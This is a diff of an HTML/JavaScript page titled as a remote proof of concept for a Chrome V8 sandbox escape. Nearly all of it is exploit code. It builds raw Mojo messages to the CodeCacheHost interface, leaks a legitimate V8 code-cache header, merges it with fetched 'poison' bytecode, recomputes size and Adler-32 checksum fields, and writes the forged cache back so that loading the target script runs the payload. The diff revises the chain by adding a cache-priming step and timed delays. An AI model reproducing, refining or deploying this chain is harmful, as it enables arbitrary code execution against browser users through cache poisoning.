@@ -4,7 +4,7 @@
     <title>Dynamic V8 Sandbox Escape - Remote PoC</title>
 </head>
 <body>
-    <h1>Stable Chrome RCE3 Chain</h1>
+    <h1>Stable Chrome RCE4 Chain</h1>
     <p>Status: <b id="status">Ready</b></p>
     <button id="launch">Launch Full Chain</button>
 
@@ -24,109 +24,104 @@
 
         async function pwn() {
             const status = document.getElementById('status');
-            status.innerText = "Step 1: Fetching Poison...";
+            status.innerText = "Step 1: Priming the V8 Cache (Loading Fat Bait)...";
 
-            // 1. Load your malicious bytecode
-            const poisonResp = await fetch(PAYLOAD_PATH);
-            const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());
+            // WARM-UP: Force V8 to compile and cache the script
+            const primerScript = document.createElement('script');
+            primerScript.src = TARGET_URL;
+            document.body.appendChild(primerScript);
 
-            // 2. Setup Mojo
-            const pipe = Mojo.createMessagePipe();
-            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
-            const host = pipe.handle0;
+            // Wait 2.5 seconds for Chrome's background thread to write the cache to disk
+            setTimeout(async () => {
+                status.innerText = "Step 2: Fetching Poison Payload...";
+                
+                const poisonResp = await fetch(PAYLOAD_PATH);
+                const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());
 
-            // 3. THE HEIST: Request the legit header from the Browser
-            status.innerText = "Step 2: Leaking V8 Header via Mojo...";
-            
-            const fetchMsg = new ArrayBuffer(128); 
-            const fv = new DataView(fetchMsg);
-            
-            // Mojo Request Header (Starts at 0)
-            fv.setUint32(0, 32, true);  // Header Size
-            fv.setUint32(4, 1, true);   // Header Version
-            fv.setUint32(8, 0, true);   // Interface ID
-            fv.setUint32(12, 3, true);  // Message ID: FetchCachedCode
-            fv.setUint32(16, 1, true);  // Flags: kMessageExpectsResponse
-            fv.setUint32(20, 0, true);  // Padding
-            fv.setBigUint64(24, 1n, true); // Request ID
+                // Setup Mojo
+                const pipe = Mojo.createMessagePipe();
+                Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
+                const host = pipe.handle0;
 
-            // Params Struct (Starts at 32)
-            fv.setUint32(32, 24, true); // Struct size
-            fv.setUint32(36, 0, true);  // Struct version
-            fv.setUint32(40, 0, true);  // CodeCacheType kJavascript
-            fv.setUint32(44, 0, true);  // Padding
-            fv.setBigUint64(48, 8n, true); // Pointer to GURL struct (48 + 8 = 56)
+                // THE HEIST
+                status.innerText = "Step 3: Leaking V8 Header via Mojo...";
+                
+                const fetchMsg = new ArrayBuffer(128); 
+                const fv = new DataView(fetchMsg);
+                
+                fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
+                fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
+                fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
+                fv.setBigUint64(24, 1n, true); 
 
-            // GURL Struct (Starts at 56)
-            fv.setUint32(56, 16, true); // Struct size
-            fv.setUint32(60, 0, true);  // Struct version
-            fv.setBigUint64(64, 8n, true); // Pointer to String Array (64 + 8 = 72)
+                fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
+                fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
+                fv.setBigUint64(48, 8n, true); 
 
-            // String Array Struct (Starts at 72)
-            // 8 byte array header + 43 char string = 51. Aligned to 8 bytes = 56.
-            fv.setUint32(72, 56, true); // Array struct size
-            fv.setUint32(76, TARGET_URL.length, true); // Num elements
-            for(let i=0; i<TARGET_URL.length; i++) {
-                fv.setUint8(80+i, TARGET_URL.charCodeAt(i)); // String starts at 80
-            }
-            // String ends safely at byte 123.
-            
-            host.writeMessage(fetchMsg, []);
+                fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
+                fv.setBigUint64(64, 8n, true); 
 
-            // 4. WATCHER: Listen for the Browser's Secret Reply
-            const result = await host.readMessage();
-            if (!result.handles || result.handles.length === 0) {
-                status.innerText = "Failed to leak header. Ensure exploit.js was cached once.";
-                return;
-            }
+                fv.setUint32(72, 56, true); 
+                fv.setUint32(76, TARGET_URL.length, true); 
+                for(let i=0; i<TARGET_URL.length; i++) {
+                    fv.setUint8(80+i, TARGET_URL.charCodeAt(i)); 
+                }
+                
+                host.writeMessage(fetchMsg, []);
 
-            status.innerText = "Step 3: Patching Checksums...";
-            const handle = result.handles[0];
-            const sharedMem = handle.mapBuffer(0, 32);
-            const legitHeader = new Uint8Array(sharedMem.buffer).slice(0, 32);
+                // WATCHER
+                const result = await host.readMessage();
+                if (!result.handles || result.handles.length === 0) {
+                    status.innerText = "FAIL: Browser still refused to cache the file. Make exploit.js bigger!";
+                    return;
+                }
 
-            // 5. THE FRANKENSTEIN: Merge Leaked Header + Poison Bytecode
-            let finalPayload = new Uint8Array(32 + poisonBytecode.length);
-            finalPayload.set(legitHeader, 0);
-            finalPayload.set(poisonBytecode, 32);
+                status.innerText = "Step 4: Header Stolen! Patching Checksums...";
+                const handle = result.handles[0];
+                const sharedMem = handle.mapBuffer(0, 32);
+                const legitHeader = new Uint8Array(sharedMem.buffer).slice(0, 32);
 
-            const pv = new DataView(finalPayload.buffer);
-            pv.setUint32(20, poisonBytecode.length, true); // Update Size
-            pv.setUint32(24, adler32(poisonBytecode), true); // Update Checksum
+                let finalPayload = new Uint8Array(32 + poisonBytecode.length);
+                finalPayload.set(legitHeader, 0);
+                finalPayload.set(poisonBytecode, 32);
 
-            // 6. RE-POISON: Push the patched cache back
-            status.innerText = "Step 4: Poisoning Browser Cache...";
-            const bufferSize = finalPayload.byteLength;
-            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
-            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
-            new Uint8Array(mapping.buffer).set(finalPayload);
+                const pv = new DataView(finalPayload.buffer);
+                pv.setUint32(20, poisonBytecode.length, true); 
+                pv.setUint32(24, adler32(poisonBytecode), true); 
 
-            // Sync Time for the security check
-            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
-            const jsTimeMs = new Date(targetResp.headers.get('date')).getTime();
-            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;
+                // RE-POISON
+                status.innerText = "Step 5: Poisoning Browser Cache...";
+                const bufferSize = finalPayload.byteLength;
+                const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
+                const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
+                new Uint8Array(mapping.buffer).set(finalPayload);
 
-            // 184-byte DidGenerateCacheableMetadata message
-            const msg = new ArrayBuffer(184);
-            const v = new DataView(msg);
-            v.setUint32(0, 24, true); v.setUint32(12, 1, true); // Message ID 1
-            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
-            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
-            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
-            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
-            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
-            v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
-            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);
+                // Sync Time for the security check
+                const targetResp = await fetch(TARGET_URL, {cache: "reload"});
+                const jsTimeMs = new Date(targetResp.headers.get('date')).getTime();
+                const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;
 
-            host.writeMessage(msg, [sharedBuffer.handle]);
+                const msg = new ArrayBuffer(184);
+                const v = new DataView(msg);
+                v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
+                v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
+                v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
+                v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
+                v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
+                for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
+                v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
+                v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);
 
-            // 7. DETONATE
-            status.innerText = "Step 5: Detonating! Watch for Calc...";
-            setTimeout(() => {
-                const s = document.createElement('script');
-                s.src = TARGET_URL;
-                document.body.appendChild(s);
-            }, 1000);
+                host.writeMessage(msg, [sharedBuffer.handle]);
+
+                status.innerText = "Step 6: Detonating! Watch for Calc...";
+                setTimeout(() => {
+                    const s = document.createElement('script');
+                    s.src = TARGET_URL;
+                    document.body.appendChild(s);
+                }, 1000);
+
+            }, 2500); // 2.5 second delay
         }
 
         document.getElementById('launch').onclick = pwn;
